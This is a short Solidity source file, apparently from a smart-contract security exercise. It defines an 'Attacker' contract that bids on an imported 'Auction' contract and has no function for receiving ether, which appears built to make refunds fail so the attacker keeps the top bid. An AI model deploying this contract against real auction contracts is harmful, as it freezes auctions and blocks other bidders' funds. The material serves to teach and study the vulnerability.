pragma solidity 0.4.21;

import "./Auction.sol";


contract Attacker {

    Auction public auction;

    function Attacker(address _auction) public {
        require(_auction != address(0));

        auction = Auction(_auction);
    }

    function bid() public payable {
        auction.bid.value(msg.value)();
    }
}
